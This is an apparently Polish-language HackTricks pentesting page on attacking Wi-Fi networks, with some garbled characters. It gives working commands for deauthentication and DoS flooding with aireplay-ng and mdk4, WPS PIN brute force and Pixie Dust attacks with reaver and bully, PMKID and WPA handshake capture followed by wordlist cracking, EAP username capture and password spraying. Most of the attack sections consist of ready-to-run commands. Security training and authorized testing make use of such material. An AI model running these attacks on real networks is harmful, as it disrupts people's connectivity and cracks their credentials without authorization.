# Pentesting Wifi

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Docz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hackerami i owcami bug贸w!

**Wgld w hacking**\
Zaanga偶uj si w treci, kt贸re zagbiaj si w emocje i wyzwania zwizane z hackingiem

**Aktualnoci o hackingu w czasie rzeczywistym**\
Bd藕 na bie偶co z dynamicznym wiatem hackingu dziki aktualnym wiadomociom i wgldom

**Najnowsze ogoszenia**\
Bd藕 informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platform

**Docz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hackerami ju偶 dzi!

## Wifi podstawowe komendy
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Narzdzia

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon za pomoc dockera**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Mo偶e przeprowadza ataki Evil Twin, KARMA i Known Beacons, a nastpnie u偶ywa szablonu phishingowego, aby uzyska prawdziwe haso do sieci lub przechwyci dane logowania do sieci spoecznociowych.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzdzie automatyzuje ataki **WPS/WEP/WPA-PSK**. Automatycznie:

* Ustawia interfejs w trybie monitorowania
* Skanuje mo偶liwe sieci - I pozwala wybra ofiar/y
* Jeli WEP - Uruchamia ataki WEP
* Jeli WPA-PSK
* Jeli WPS: atak Pixie dust i atak brute-force (uwa偶aj, atak brute-force mo偶e zaj du偶o czasu). Zauwa偶, 偶e nie pr贸buje pustego PIN-u ani PIN-贸w z bazy danych/wygenerowanych.
* Pr贸buje przechwyci PMKID z AP, aby go zama
* Pr贸buje deautoryzowa klient贸w AP, aby przechwyci handshake
* Jeli PMKID lub Handshake, pr贸buje zama haso u偶ywajc 5000 najpopularniejszych hase.

## Podsumowanie atak贸w

* **DoS**
* Deautoryzacja/disasocjacja -- Rozcz wszystkich (lub konkretny ESSID/Klient)
* Losowe faszywe AP -- Ukryj sieci, mo偶liwe awarie skaner贸w
* Przeci偶enie AP -- Spr贸buj zabi AP (zwykle mao u偶yteczne)
* WIDS -- Baw si IDS
* TKIP, EAPOL -- Niekt贸re specyficzne ataki DoS na niekt贸re AP
* **Cracking**
* Zam **WEP** (kilka narzdzi i metod)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute-force
* \[DoS +] **WPA handshake** przechwytywanie + Zamanie
* **WPA-MGT**
* **Przechwytywanie nazwy u偶ytkownika**
* **Bruteforce** powiadczenia
* **Evil Twin** (z lub bez DoS)
* **Open** Evil Twin \[+ DoS] -- U偶yteczne do przechwytywania powiadcze portalu przechwytywania i/lub przeprowadzania atak贸w LAN
* **WPA-PSK** Evil Twin -- U偶yteczne do atak贸w sieciowych, jeli znasz haso
* **WPA-MGT** -- U偶yteczne do przechwytywania powiadcze firmowych
* **KARMA, MANA**, **Loud MANA**, **Znany beacon**
* **+ Open** -- U偶yteczne do przechwytywania powiadcze portalu przechwytywania i/lub przeprowadzania atak贸w LAN
* **+ WPA** -- U偶yteczne do przechwytywania handshake'贸w WPA

## DOS

### Pakiety deautoryzacji

**Opis z** [**tutaj**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Ataki **deautoryzacji**, powszechnie stosowana metoda w hackingu Wi-Fi, polegaj na faszowaniu ramek "zarzdzajcych", aby **si rozczy urzdzenia z sieci**. Te niezaszyfrowane pakiety oszukuj klient贸w, sprawiajc, 偶e wierz, i偶 pochodz z legalnej sieci, co umo偶liwia atakujcym zbieranie handshake'贸w WPA do cel贸w amania lub trwae zak贸canie pocze sieciowych. Ta taktyka, niepokojca w swojej prostocie, jest szeroko stosowana i ma znaczce implikacje dla bezpieczestwa sieci.

**Deautoryzacja przy u偶yciu Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 oznacza deautoryzacj
* 1 to liczba deautoryzacji do wysania (mo偶esz wysa wiele, jeli chcesz); 0 oznacza wysyanie ich cigle
* \-a 00:14:6C:7E:40:80 to adres MAC punktu dostpowego
* \-c 00:0F:B5:34:30:30 to adres MAC klienta do deautoryzacji; jeli to zostanie pominite, wysyana jest deautoryzacja rozgoszeniowa (nie zawsze dziaa)
* ath0 to nazwa interfejsu

### Pakiety Dezaktywacji

**Pakiety dezaktywacji**, podobnie jak pakiety deautoryzacji, s rodzajem ramki zarzdzajcej u偶ywanej w sieciach Wi-Fi. Pakiety te su偶 do zerwania poczenia midzy urzdzeniem (takim jak laptop lub smartfon) a punktem dostpowym (AP). G贸wna r贸偶nica midzy dezaktywacj a deautoryzacj le偶y w ich scenariuszach u偶ycia. Podczas gdy AP emituje **pakiety deautoryzacji, aby usun nieautoryzowane urzdzenia z sieci, pakiety dezaktywacji s zazwyczaj wysyane, gdy AP przechodzi w tryb wyczenia**, ponownego uruchamiania lub przenoszenia, co wymaga rozczenia wszystkich podczonych wz贸w.

**Ten atak mo偶na przeprowadzi za pomoc mdk4 (tryb "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Wicej atak贸w DOS za pomoc mdk4**

**W** [**tutaj**](https://en.kali.tools/?p=864)**.**

**TRYB ATAKU b: Flooding Beacon贸w**

Wysya ramki beacon贸w, aby pokaza faszywe AP na klientach. Mo偶e to czasami spowodowa awari skaner贸w sieciowych, a nawet sterownik贸w!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**TRYB ATAKU a: Denial-Of-Service uwierzytelnienia**

Wysyanie ramek uwierzytelniajcych do wszystkich dostpnych Punkt贸w Dostpu (AP) w zasigu mo偶e przeci偶y te AP, szczeg贸lnie gdy zaanga偶owanych jest wielu klient贸w. Ten intensywny ruch mo偶e prowadzi do niestabilnoci systemu, powodujc, 偶e niekt贸re AP mog si zawiesi lub nawet zresetowa.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**TRYB ATAKU p: Probing SSID i Bruteforcing**

Probing Access Points (APs) sprawdza, czy SSID jest odpowiednio ujawniony i potwierdza zasig AP. Ta technika, w poczeniu z **bruteforcing ukrytych SSID** z lub bez listy s贸w, pomaga w identyfikacji i uzyskiwaniu dostpu do ukrytych sieci.

**TRYB ATAKU m: Wykorzystanie rodk贸w Przeciwdziaajcych Michaelowi**

Wysyanie losowych lub duplikowanych pakiet贸w do r贸偶nych kolejek QoS mo偶e wywoa rodki Przeciwdziaajce Michaelowi na **TKIP APs**, prowadzc do jednominutowego wyczenia AP. Ta metoda jest skuteczn taktyk ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**TRYB ATAKU e: Wstrzykiwanie pakiet贸w EAPOL Start i Logoff**

Zalewanie AP **ramkami EAPOL Start** tworzy **faszywe sesje**, przytaczajc AP i blokujc legalnych klient贸w. Alternatywnie, wstrzykiwanie **faszywych wiadomoci EAPOL Logoff** wymusza rozczenie klient贸w, obie metody skutecznie zak贸caj usugi sieciowe.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**TRYB ATAKU s: Ataki na sieci mesh IEEE 802.11s**

R贸偶ne ataki na zarzdzanie czami i routowanie w sieciach mesh.

**TRYB ATAKU w: Mylenie WIDS**

Krzy偶owe czenie klient贸w z wieloma wzami WDS lub faszywymi AP mo偶e manipulowa systemami wykrywania i zapobiegania wamaniom, tworzc zamieszanie i potencjalne nadu偶ycie systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**TRYB ATAKU f: Fuzzer Pakiet贸w**

Fuzzer pakiet贸w z r贸偶norodnymi 藕r贸dami pakiet贸w i kompleksowym zestawem modyfikator贸w do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje wikszo atak贸w zaproponowanych w poprzednich komentarzach:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) upraszcza proces czenia urzdze z routerem, zwikszajc szybko i atwo konfiguracji dla sieci szyfrowanych za pomoc **WPA** lub **WPA2** Personal. Jest nieskuteczny w przypadku atwo kompromitowanego zabezpieczenia WEP. WPS wykorzystuje 8-cyfrowy PIN, weryfikowany w dw贸ch czciach, co czyni go podatnym na ataki brute-force z powodu ograniczonej liczby kombinacji (11 000 mo偶liwoci).

### WPS Bruteforce

Istniej 2 g贸wne narzdzia do przeprowadzenia tej akcji: Reaver i Bully.

* **Reaver** zosta zaprojektowany jako solidny i praktyczny atak przeciwko WPS i by testowany na szerokiej gamie punkt贸w dostpowych i implementacji WPS.
* **Bully** to **nowa implementacja** ataku brute force WPS, napisana w C. Ma kilka zalet w por贸wnaniu do oryginalnego kodu reaver: mniej zale偶noci, poprawiona wydajno pamici i CPU, prawidowe obsugiwanie endianness oraz bardziej rozbudowany zestaw opcji.

Atak wykorzystuje **wra偶liwo PIN-u WPS**, szczeg贸lnie jego ujawnienie pierwszych czterech cyfr oraz rol ostatniej cyfry jako sumy kontrolnej, co uatwia atak brute-force. Jednak obrony przed atakami brute-force, takie jak **blokowanie adres贸w MAC** agresywnych atakujcych, wymagaj **rotacji adres贸w MAC**, aby kontynuowa atak.

Po uzyskaniu PIN-u WPS za pomoc narzdzi takich jak Bully lub Reaver, atakujcy mo偶e wydedukowa WPA/WPA2 PSK, zapewniajc **stay dostp do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

To podejcie celuje w PIN-y WPS, wykorzystujc znane luki:

1. **Wczeniej odkryte PIN-y**: Wykorzystaj baz danych znanych PIN-贸w powizanych z konkretnymi producentami, kt贸rzy u偶ywaj jednolitych PIN-贸w WPS. Ta baza danych koreluje pierwsze trzy oktety adres贸w MAC z prawdopodobnymi PIN-ami dla tych producent贸w.
2. **Algorytmy generowania PIN-贸w**: Wykorzystaj algorytmy takie jak ComputePIN i EasyBox, kt贸re obliczaj PIN-y WPS na podstawie adresu MAC AP. Algorytm Arcadyan dodatkowo wymaga identyfikatora urzdzenia, co dodaje warstw do procesu generowania PIN-u.

### WPS Pixie Dust attack

**Dominique Bongard** odkry bd w niekt贸rych punktach dostpowych (AP) dotyczcy tworzenia tajnych kod贸w, znanych jako **nonces** (**E-S1** i **E-S2**). Jeli te nonces mo偶na odgadn, zamanie PIN-u WPS AP staje si atwe. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodni, 偶e jest legitny, a nie faszywy (rogue) AP. Te nonces s zasadniczo "kluczami" do odblokowania "sejfu", kt贸ry przechowuje PIN WPS. Wicej na ten temat mo偶na znale藕 [tutaj](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

M贸wic prosto, problem polega na tym, 偶e niekt贸re AP nie u偶yway wystarczajco losowych kluczy do szyfrowania PIN-u podczas procesu czenia. To sprawia, 偶e PIN jest podatny na odgadnicie z zewntrz sieci (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Jeli nie chcesz przecza urzdzenia w tryb monitorowania, lub `reaver` i `bully` maj jaki problem, mo偶esz spr贸bowa [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzdzie mo偶e przeprowadzi atak Pixie Dust bez koniecznoci przeczania w tryb monitorowania.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Atak Null Pin

Niekt贸re 藕le zaprojektowane systemy pozwalaj nawet na dostp za pomoc **Null PIN** (pusty lub nieistniejcy PIN), co jest do nietypowe. Narzdzie **Reaver** jest w stanie testowa t podatno, w przeciwiestwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki WPS mo偶na atwo przeprowadzi za pomoc _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 i 6 pozwalaj na wypr贸bowanie **twojego wasnego PIN-u** (jeli go masz)
* 7 i 8 wykonuj **atak Pixie Dust**
* 13 pozwala na przetestowanie **NULL PIN**
* 11 i 12 **zbior PIN-y zwizane z wybranym AP z dostpnych baz danych** i **wygeneruj** mo偶liwe **PIN-y** za pomoc: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, czemu nie?)
* 9 i 10 przetestuj **ka偶dy mo偶liwy PIN**

## **WEP**

Tak zniszczony i nieu偶ywany w dzisiejszych czasach. Po prostu wiedz, 偶e _**airgeddon**_ ma opcj WEP nazwan "All-in-One", aby zaatakowa ten rodzaj ochrony. Wiele narzdzi oferuje podobne opcje.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Docz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hackerami i owcami bd贸w!

**Hacking Insights**\
Zaanga偶uj si w treci, kt贸re zagbiaj si w emocje i wyzwania zwizane z hackingiem

**Real-Time Hack News**\
Bd藕 na bie偶co z dynamicznym wiatem hackingu dziki wiadomociom i spostrze偶eniom w czasie rzeczywistym

**Latest Announcements**\
Bd藕 informowany o najnowszych nagrodach za bdy oraz istotnych aktualizacjach platformy

**Docz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hackerami ju偶 dzi!

***

## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [ujawni](https://hashcat.net/forum/thread-7717.html) now metod ataku, unikaln, poniewa偶 potrzebuje tylko **jednego pakietu** i nie wymaga, aby jakiekolwiek urzdzenia byy podczone do docelowego APwystarczy interakcja midzy atakujcym a AP.

Wiele nowoczesnych router贸w dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas asocjacji, znane jako `Robust Security Network`. To zawiera `PMKID`.

Jak wyjania oryginalny post, **PMKID** jest tworzony przy u偶yciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Biorc pod uwag, 偶e "Nazwa PMK" jest staa, znamy BSSID AP i stacji, a `PMK` jest identyczny z tym z penego 4-etapowego ucisku doni, **hashcat** mo偶e wykorzysta te informacje do zamania PSK i odzyskania hasa!

Aby **zgromadzi** te informacje i **bruteforce'owa** lokalnie haso, mo偶esz zrobi:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Zapane **PMKIDy** bd wywietlane w **konsoli** i r贸wnie偶 **zapisane** w \_ **/tmp/attack.pcap**\_\
Teraz przekszta zrzut do formatu **hashcat/john** i zam go:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Prosz zauwa偶y, 偶e format poprawnego hasha zawiera **4 czci**, jak: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Jeli Tw贸j **zawiera tylko** **3 czci**, to jest **nieprawidowy** (przechwycenie PMKID nie byo wa偶ne).

Zauwa偶, 偶e `hcxdumptool` **r贸wnie偶 przechwytuje handshake'i** (co takiego si pojawi: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Mo偶esz **przeksztaci** **handshake'i** do formatu **hashcat**/**john** u偶ywajc `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Zauwa偶yem, 偶e niekt贸re przechwycone handshake za pomoc tego narzdzia nie mogy by zamane, nawet znajc poprawne haso. Zalecabym przechwytywanie handshake r贸wnie偶 w tradycyjny spos贸b, jeli to mo偶liwe, lub przechwytywanie ich kilku za pomoc tego narzdzia._

### Przechwytywanie handshake

Atak na sieci **WPA/WPA2** mo偶na przeprowadzi poprzez przechwycenie **handshake** i pr贸b **zamania** hasa **offline**. Proces ten polega na monitorowaniu komunikacji konkretnej sieci i **BSSID** na okrelonym **kanale**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **kana** i **poczonego klienta** docelowej sieci.
2. U偶yj `airodump-ng`, aby monitorowa ruch sieciowy na okrelonym kanale i BSSID, majc nadziej na przechwycenie handshake. Komenda bdzie wyglda nastpujco:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwikszy szans na przechwycenie handshake, chwilowo odcz klienta od sieci, aby wymusi ponown autoryzacj. Mo偶na to zrobi za pomoc polecenia `aireplay-ng`, kt贸re wysya pakiety deautoryzacji do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note, 偶e gdy klient zosta zdezautoryzowany, m贸g spr贸bowa poczy si z innym AP lub, w innych przypadkach, z inn sieci._

Gdy w `airodump-ng` pojawi si informacje o handshake, oznacza to, 偶e handshake zosta przechwycony i mo偶esz przesta nasuchiwa:

![](<../../.gitbook/assets/image (172) (1).png>)

Gdy handshake zostanie przechwycony, mo偶esz go **zama** za pomoc `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawd藕, czy handshake jest w pliku

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeli to narzdzie znajdzie niekompletny handshake ESSID przed ukoczonym, nie wykryje wa偶nego._ 

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

W **ustawieniach WiFi dla przedsibiorstw napotkasz r贸偶ne metody uwierzytelniania**, z kt贸rych ka偶da oferuje r贸偶ne poziomy bezpieczestwa i funkcje zarzdzania. Gdy u偶ywasz narzdzi takich jak `airodump-ng`, aby sprawdzi ruch sieciowy, mo偶esz zauwa偶y identyfikatory dla tych typ贸w uwierzytelniania. Niekt贸re powszechne metody to:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Ta metoda obsuguje tokeny sprztowe i jednorazowe hasa w ramach EAP-PEAP. W przeciwiestwie do MSCHAPv2, nie u偶ywa wyzwania od partnera i wysya hasa w postaci niezaszyfrowanej do punktu dostpowego, co stwarza ryzyko atak贸w typu downgrade.
2. **EAP-MD5 (Message Digest 5)**:
* Polega na wysyaniu hasha MD5 hasa z klienta. **Nie jest zalecane** z powodu podatnoci na ataki sownikowe, braku uwierzytelnienia serwera oraz niemo偶noci generowania kluczy WEP specyficznych dla sesji.
3. **EAP-TLS (Transport Layer Security)**:
* Wykorzystuje zar贸wno certyfikaty po stronie klienta, jak i serwera do uwierzytelniania i mo偶e dynamicznie generowa klucze WEP oparte na u偶ytkownikach i sesjach w celu zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Zapewnia wzajemne uwierzytelnianie przez zaszyfrowany tunel, a tak偶e metod do wyprowadzania dynamicznych kluczy WEP dla ka偶dego u偶ytkownika i sesji. Wymaga tylko certyfikat贸w po stronie serwera, a klienci u偶ywaj powiadcze.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Dziaa podobnie do EAP, tworzc tunel TLS dla chronionej komunikacji. Umo偶liwia u偶ycie sabszych protoko贸w uwierzytelniania na szczycie EAP dziki ochronie oferowanej przez tunel.
* **PEAP-MSCHAPv2**: Czsto okrelane jako PEAP, czy podatny mechanizm wyzwania/odpowiedzi MSCHAPv2 z ochronnym tunelem TLS.
* **PEAP-EAP-TLS (lub PEAP-TLS)**: Podobne do EAP-TLS, ale inicjuje tunel TLS przed wymian certyfikat贸w, oferujc dodatkow warstw bezpieczestwa.

Mo偶esz znale藕 wicej informacji na temat tych metod uwierzytelniania [tutaj](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) i [tutaj](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie nazwy u偶ytkownika

Czytajc [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), wyglda na to, 偶e jeli u偶ywasz **EAP**, to **"Identity"** **messages** musz by **obsugiwane**, a **nazwa u偶ytkownika** bdzie wysyana w **czystym** w **"Response Identity"** messages.

Nawet u偶ywajc jednej z najbezpieczniejszych metod uwierzytelniania: **PEAP-EAP-TLS**, mo偶liwe jest **przechwycenie nazwy u偶ytkownika wysanej w protokole EAP**. Aby to zrobi, **przechwy komunikacj uwierzytelniajc** (uruchom `airodump-ng` w kanale i `wireshark` na tym samym interfejsie) i filtruj pakiety wedug `eapol`.\
W pakiecie "**Response, Identity**" pojawi si **nazwa u偶ytkownika** klienta.

![](<../../.gitbook/assets/image (850).png>)

### Anonimowe to偶samoci

Ukrywanie to偶samoci jest obsugiwane zar贸wno przez EAP-PEAP, jak i EAP-TTLS. W kontekcie sieci WiFi, 偶danie EAP-Identity jest zazwyczaj inicjowane przez punkt dostpowy (AP) podczas procesu asocjacji. Aby zapewni ochron anonimowoci u偶ytkownika, odpowied藕 z klienta EAP na urzdzeniu u偶ytkownika zawiera tylko niezbdne informacje wymagane do przetworzenia 偶dania przez pocztkowy serwer RADIUS. Koncepcja ta jest ilustrowana przez nastpujce scenariusze:

* EAP-Identity = anonimowy
* W tym scenariuszu wszyscy u偶ytkownicy u偶ywaj pseudonimowego "anonimowy" jako swojego identyfikatora u偶ytkownika. Pocztkowy serwer RADIUS dziaa jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za zarzdzanie stron serwera protokou PEAP lub TTLS. Wewntrzna (chroniona) metoda uwierzytelniania jest nastpnie obsugiwana lokalnie lub delegowana do zdalnego (domowego) serwera RADIUS.
* EAP-Identity = anonimowy@realm\_x
* W tej sytuacji u偶ytkownicy z r贸偶nych kr贸lestw ukrywaj swoje to偶samoci, jednoczenie wskazujc swoje odpowiednie kr贸lestwa. Umo偶liwia to pocztkowemu serwerowi RADIUS proxy 偶dania EAP-PEAP lub EAP-TTLS do serwer贸w RADIUS w ich domowych kr贸lestwach, kt贸re dziaaj jako serwer PEAP lub TTLS. Pocztkowy serwer RADIUS dziaa wycznie jako wze przeka藕nikowy RADIUS.
* Alternatywnie, pocztkowy serwer RADIUS mo偶e dziaa jako serwer EAP-PEAP lub EAP-TTLS i albo obsugiwa chronion metod uwierzytelniania, albo przekazywa j do innego serwera. Ta opcja uatwia konfiguracj odmiennych polityk dla r贸偶nych kr贸lestw.

W EAP-PEAP, po nawizaniu tunelu TLS midzy serwerem PEAP a klientem PEAP, serwer PEAP inicjuje 偶danie EAP-Identity i przesya je przez tunel TLS. Klient odpowiada na to drugie 偶danie EAP-Identity, wysyajc odpowied藕 EAP-Identity zawierajc prawdziw to偶samo u偶ytkownika przez zaszyfrowany tunel. To podejcie skutecznie zapobiega ujawnieniu rzeczywistej to偶samoci u偶ytkownika komukolwiek podsuchujcemu ruch 802.11.

EAP-TTLS postpuje nieco inaczej. W przypadku EAP-TTLS klient zazwyczaj uwierzytelnia si za pomoc PAP lub CHAP, zabezpieczonych przez tunel TLS. W tym przypadku klient docza atrybut User-Name oraz atrybut Password lub CHAP-Password w pocztkowej wiadomoci TLS wysyanej po nawizaniu tunelu.

Bez wzgldu na wybrany protok贸, serwer PEAP/TTLS uzyskuje wiedz o prawdziwej to偶samoci u偶ytkownika po nawizaniu tunelu TLS. Prawdziwa to偶samo mo偶e by reprezentowana jako user@realm lub po prostu user. Jeli serwer PEAP/TTLS jest r贸wnie偶 odpowiedzialny za uwierzytelnienie u偶ytkownika, teraz posiada to偶samo u偶ytkownika i kontynuuje metod uwierzytelniania chronion przez tunel TLS. Alternatywnie, serwer PEAP/TTLS mo偶e przekaza nowe 偶danie RADIUS do domowego serwera RADIUS u偶ytkownika. To nowe 偶danie RADIUS pomija warstw protokou PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewntrzne wiadomoci EAP s przesyane do domowego serwera RADIUS bez opakowania EAP-PEAP lub EAP-TTLS. Atrybut User-Name wiadomoci RADIUS wychodzcej zawiera prawdziw to偶samo u偶ytkownika, zastpujc anonimow nazw u偶ytkownika z przychodzcego 偶dania RADIUS. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsugiwane tylko przez TTLS), atrybut User-Name i inne atrybuty uwierzytelniania wyodrbnione z adunku TLS s zastpowane w wychodzcej wiadomoci RADIUS, zastpujc anonimow nazw u偶ytkownika i atrybuty TTLS EAP-Message znajdujce si w przychodzcym 偶daniu RADIUS.

Aby uzyska wicej informacji, sprawd藕 [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Jeli oczekuje si, 偶e klient u偶yje **nazwa u偶ytkownika i haso** (zauwa偶, 偶e **EAP-TLS nie bdzie wa偶ne** w tym przypadku), mo偶esz spr贸bowa uzyska **list** **nazw u偶ytkownik贸w** (zobacz nastpna cz) i **hase** i spr贸bowa **bruteforce** dostpu za pomoc [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
